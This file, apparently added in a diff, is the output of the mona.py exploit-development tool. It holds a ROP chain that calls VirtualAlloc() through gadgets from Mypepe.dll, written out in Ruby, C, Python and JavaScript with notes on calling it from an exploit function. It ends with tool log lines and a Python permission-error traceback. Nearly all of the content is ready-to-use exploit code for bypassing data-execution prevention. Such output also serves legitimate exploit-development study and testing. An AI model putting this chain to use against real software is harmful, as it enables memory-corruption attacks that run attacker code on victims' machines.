+ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
+--------------------------------------------------------
+
+*** [ Ruby ] ***
+
+  def create_rop_chain()
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      0x7801eb94,  # POP EBP # RETN [Mypepe.dll] 
+      0x7801eb94,  # skip 4 bytes [Mypepe.dll]
+      0x7801ee74,  # POP EBX # RETN [Mypepe.dll] 
+      0x00000001,  # 0x00000001-> ebx
+      0x7802920e,  # POP EDX # RETN [Mypepe.dll] 
+      0x00001000,  # 0x00001000-> edx
+      0x7800a849,  # POP ECX # RETN [Mypepe.dll] 
+      0x00000040,  # 0x00000040-> ecx
+      0x7800f91a,  # POP EDI # RETN [Mypepe.dll] 
+      0x7800b281,  # RETN (ROP NOP) [Mypepe.dll]
+      0x78001492,  # POP ESI # RETN [Mypepe.dll] 
+      0x780041ed,  # JMP [EAX] [Mypepe.dll]
+      0x78013953,  # POP EAX # RETN [Mypepe.dll] 
+      0x7802e0b0,  # ptr to &VirtualAlloc() [IAT Mypepe.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+      0x7800f7c1,  # ptr to 'push esp # ret ' [Mypepe.dll]
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+
+
+  # Call the ROP chain generator inside the 'exploit' function :
+
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ C ] ***
+
+  #define CREATE_ROP_CHAIN(name, ...) \
+    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
+    unsigned int name[name##_length / sizeof(unsigned int)]; \
+    create_rop_chain(name, ##__VA_ARGS__);
+
+  int create_rop_chain(unsigned int *buf, unsigned int )
+  {
+    // rop chain generated with mona.py - www.corelan.be
+    unsigned int rop_gadgets[] = {
+      0x7801eb94,  // POP EBP // RETN [Mypepe.dll] 
+      0x7801eb94,  // skip 4 bytes [Mypepe.dll]
+      0x7801ee74,  // POP EBX // RETN [Mypepe.dll] 
+      0x00000001,  // 0x00000001-> ebx
+      0x7802920e,  // POP EDX // RETN [Mypepe.dll] 
+      0x00001000,  // 0x00001000-> edx
+      0x7800a849,  // POP ECX // RETN [Mypepe.dll] 
+      0x00000040,  // 0x00000040-> ecx
+      0x7800f91a,  // POP EDI // RETN [Mypepe.dll] 
+      0x7800b281,  // RETN (ROP NOP) [Mypepe.dll]
+      0x78001492,  // POP ESI // RETN [Mypepe.dll] 
+      0x780041ed,  // JMP [EAX] [Mypepe.dll]
+      0x78013953,  // POP EAX // RETN [Mypepe.dll] 
+      0x7802e0b0,  // ptr to &VirtualAlloc() [IAT Mypepe.dll]
+      0x78009791,  // PUSHAD // ADD AL,80 // RETN [Mypepe.dll] 
+      0x7800f7c1,  // ptr to 'push esp // ret ' [Mypepe.dll]
+    };
+    if(buf != NULL) {
+      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
+    };
+    return sizeof(rop_gadgets);
+  }
+
+  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
+  CREATE_ROP_CHAIN(rop_chain, );
+  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
+  // unsigned int rop_chain[256];
+  // int rop_chain_length = create_rop_chain(rop_chain, );
+
+*** [ Python ] ***
+
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      0x7801eb94,  # POP EBP # RETN [Mypepe.dll] 
+      0x7801eb94,  # skip 4 bytes [Mypepe.dll]
+      0x7801ee74,  # POP EBX # RETN [Mypepe.dll] 
+      0x00000001,  # 0x00000001-> ebx
+      0x7802920e,  # POP EDX # RETN [Mypepe.dll] 
+      0x00001000,  # 0x00001000-> edx
+      0x7800a849,  # POP ECX # RETN [Mypepe.dll] 
+      0x00000040,  # 0x00000040-> ecx
+      0x7800f91a,  # POP EDI # RETN [Mypepe.dll] 
+      0x7800b281,  # RETN (ROP NOP) [Mypepe.dll]
+      0x78001492,  # POP ESI # RETN [Mypepe.dll] 
+      0x780041ed,  # JMP [EAX] [Mypepe.dll]
+      0x78013953,  # POP EAX # RETN [Mypepe.dll] 
+      0x7802e0b0,  # ptr to &VirtualAlloc() [IAT Mypepe.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+      0x7800f7c1,  # ptr to 'push esp # ret ' [Mypepe.dll]
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ JavaScript ] ***
+
+  //rop chain generated with mona.py - www.corelan.be
+  rop_gadgets = unescape(
+    "%ueb94%u7801" + // 0x7801eb94 : ,# POP EBP # RETN [Mypepe.dll] 
+    "%ueb94%u7801" + // 0x7801eb94 : ,# skip 4 bytes [Mypepe.dll]
+    "%uee74%u7801" + // 0x7801ee74 : ,# POP EBX # RETN [Mypepe.dll] 
+    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
+    "%u920e%u7802" + // 0x7802920e : ,# POP EDX # RETN [Mypepe.dll] 
+    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
+    "%ua849%u7800" + // 0x7800a849 : ,# POP ECX # RETN [Mypepe.dll] 
+    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
+    "%uf91a%u7800" + // 0x7800f91a : ,# POP EDI # RETN [Mypepe.dll] 
+    "%ub281%u7800" + // 0x7800b281 : ,# RETN (ROP NOP) [Mypepe.dll]
+    "%u1492%u7800" + // 0x78001492 : ,# POP ESI # RETN [Mypepe.dll] 
+    "%u41ed%u7800" + // 0x780041ed : ,# JMP [EAX] [Mypepe.dll]
+    "%u3953%u7801" + // 0x78013953 : ,# POP EAX # RETN [Mypepe.dll] 
+    "%ue0b0%u7802" + // 0x7802e0b0 : ,# ptr to &VirtualAlloc() [IAT Mypepe.dll]
+    "%u9791%u7800" + // 0x78009791 : ,# PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    "%uf7c1%u7800" + // 0x7800f7c1 : ,# ptr to 'push esp # ret ' [Mypepe.dll]
+    ""); //  : 
+
+
+--------------------------------------------------------------------------------------------------
+
+
+    ROP generator finished
+
+[+] Writing stackpivots to file stackpivot.txt
+    Wrote 0 pivots to file 
+[+] Writing suggestions to file rop_suggestions.txt
+********************************************************************************
+Traceback (most recent call last):
+  File "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\mona.py", line 18183, in main
+    commands[command].parseProc(opts)
+  File "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\mona.py", line 11341, in procROP
+    findROPGADGETS(modulecriteria,criteria,endings,maxoffset,depth,split,thedistance,fast,mode)
+  File "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\mona.py", line 6345, in findROPGADGETS
+    with open(thislog, "a") as fh:
+IOError: [Errno 13] Permission denied: 'rop_suggestions.txt'
+
+********************************************************************************
